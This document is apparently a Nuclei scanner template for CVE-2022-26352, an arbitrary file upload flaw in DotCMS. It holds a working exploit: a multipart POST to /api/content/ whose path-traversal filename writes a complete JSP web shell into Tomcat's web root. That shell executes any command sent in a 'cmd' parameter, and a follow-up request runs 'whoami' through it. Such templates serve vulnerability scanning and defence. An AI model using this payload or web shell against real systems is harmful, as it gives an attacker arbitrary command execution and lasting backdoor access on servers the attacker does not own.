id: CVE-2022-26352

info:
  name: DotCMS Arbitrary File Upload
  author: h1ei1
  severity: critical
  description: There is an arbitrary file upload vulnerability in the /api/content/ path of the DotCMS management system, and attackers can upload malicious Trojans to obtain server permissions.
  reference:
    - https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/
    - https://github.com/h1ei1/POC/tree/main/CVE-2022-26352
  tags: rce,DotCMS,cve,cve2022

requests:
  - raw:
      - |
        POST /api/content/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=------------------------aadc326f7ae3eac3
        
        --------------------------aadc326f7ae3eac3
        Content-Disposition: form-data; name="name"; filename="../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/{{randstr}}.jsp"
        Content-Type: text/plain
        
        <%@ page import="java.util.*,java.io.*"%>
        <%
        %>
        <HTML><BODY>
        Commands with JSP
        <FORM METHOD="GET" NAME="myform" ACTION="">
        <INPUT TYPE="text" NAME="cmd">
        <INPUT TYPE="submit" VALUE="Send">
        </FORM>
        <pre>
        <%
        if (request.getParameter("cmd") != null) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
           Process p;
           if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
                p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
            }
           else{
               p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            }
            OutputStream os = p.getOutputStream();
           InputStream in = p.getInputStream();
           DataInputStream dis = new DataInputStream(in);
           String disr = dis.readLine();
           while ( disr != null ) {
           out.println(disr);
            disr = dis.readLine();
            }
        }
        %>
        </pre>
        </BODY></HTML>
        --------------------------aadc326f7ae3eac3--

      - |
        GET /{{randstr}}.jsp?cmd=whoami HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Commands with JSP"
